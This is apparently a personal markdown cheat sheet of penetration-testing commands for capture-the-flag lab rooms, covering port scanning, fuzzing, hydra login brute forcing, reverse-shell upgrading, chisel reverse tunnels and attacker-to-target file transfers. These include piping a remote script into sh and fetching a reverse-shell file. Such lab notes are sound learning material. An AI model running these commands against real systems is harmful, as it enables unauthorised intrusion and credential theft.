# Common Commands I Use Frequently (In no particular order)

## Enumeration
### Port Scanning
- `IP=x.x.x.x`
- `sudo masscan -p1-65535 $IP --rate=1000 -e tun0 > ports`
- `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
- `nmap -Pn -sVC -vv -p$ports $IP`
### Web Directory Fuzzing
- `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://xxxxxx.xxx/FUZZ -fc 404,400`
### Things to do on the Target Machine Once you Have a Foothold
- List listening ports on the machine `ss -ltn`
- List all files and folders including hidden ones in a directory `ls al`

## Encryption/Decryption
### PGP
- Add an encryption key you've found to the keyring `gpg --import x.key`
- Use aforemntioned key to decrypt a file `gpg x.pdf.gpg`
### SSH
- Generate SSH keys for a user `ssh-keygen -f username`

## Login Brute Forcing
### FTP
- Use lists created by RoomPrepper (The createLists.sh script takes the users and passwords from the notes.md file and creates these lists) `hydra -L user.lst -P password.lst ftp://x.x.x.x`
### Web
- Using hydra with a captured request using the format ```hydra -l <username> -P <password_wordlist> <machine_ip> <request_type> '<login_page>:<request_body>:<invalid_notification>'``` so an example command is as follows `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.174.201 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=c7UvYlF%2FOoYdanjSx3HqFGCZ9ktcaqHpKyHHiKbVfNezx4JX%2BkvSkLj9IH9GbWF4z41mnESai4vX%2FkWm576GotEhS3W66Cvoz9as16iMPgK0d6yqjJHRpODyonGR2%2Fp3%2FIM8LcN%2Fr5X7zNiaYMnBzEAjp8eFYgBqjCVyUgoP2v7tqlHu&__EVENTVALIDATION=PknlTsjoXO2tIIQR4GG4BnQkewRFwQjxfpAKT06eOvI%2FL%2F07msVZ7JUQ4nBX7RAnbfZRdZ2%2B4gUl2BdBAuoEtbsQww69pvT2jUbpA%2F00YfgzuX8de4fjki4HfD4SDig3jJjMjZoQBLYOdW2Y%2B8W%2FTf17Bdd0hRBOzS%2BpvBmRWe0UIBx7&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vv`
- Using hydra with some parameters instead of the entire login request example `hydra -l milesdyson -P log1.txt 10.x.x.x http-post-form '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user`
- Using hydra to brute force a basic auth page `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt -s 80 -f enum.thm http-get /labs/basic_auth`

## Upgrade Reverse Shell (To one that has autocomplete and won't be killed by Ctrl^C etc.)
### Using Python
1. In reverse shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2. Press CTRL^Z to put the reverse shell in the background
3. In the host terminal (It should be at this stage now when the reverse shell has been backgrounded) `stty raw -echo; fg`
4. In the reverse shell that has now been foregrounded `echo TERM=xterm-256color` followed by `reset` if required

## Find files
### Find Command
- `find / 2>/dev/null | grep desired_word`

## Tunneling
### SSH
- Open an SSH session where all traffic to port 1111 on the target machine is forwarded to port 1111 on the attacking machine `ssh user@x.x.x.x -L 1111:localhost:1111`
### Chisel
1. Transfer chisel binary to target
2. Start chisel server on attacker machine `chisel server --reverse --port 9001`
3. On the target run `chisel client 10.x.x.x:9001 R:2049:127.0.0.1:2049`

## Facilitation of File Transfers Between Attacker and Target
### Python web server
1. Start a simple web server from current working directory `python3 -m http.server 8000`
  - Download a file from aforementioned simple web server `wget http://10.x.x.x:8000/revsh.php` or `curl -O http://10.x.x.x:8000/chisel`
  - Run a file from aforementioned simple web server `curl http://10.x.x.x:8000/linpeas.sh | sh`
